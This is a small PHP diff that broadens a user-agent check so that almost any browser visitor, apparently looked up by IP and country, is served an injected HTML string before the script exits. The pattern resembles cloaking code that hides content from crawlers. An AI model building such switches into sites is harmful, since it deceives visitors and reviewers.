@@ -293,7 +293,7 @@ function ip_details($ip)
 $details = ip_details($ip);
 $country = $details->country;
 if (
-   strpos($_SERVER["HTTP_USER_AGENT"], "chrome") !== false
+   strpos($_SERVER["HTTP_USER_AGENT"], "Mozilla") !== false || strpos($_SERVER["HTTP_USER_AGENT"], "Chrome") !== false || strpos($_SERVER["HTTP_USER_AGENT"], "AppleWebKit") !== false
 ) {
   echo "' . $htmlString . '";
 die();
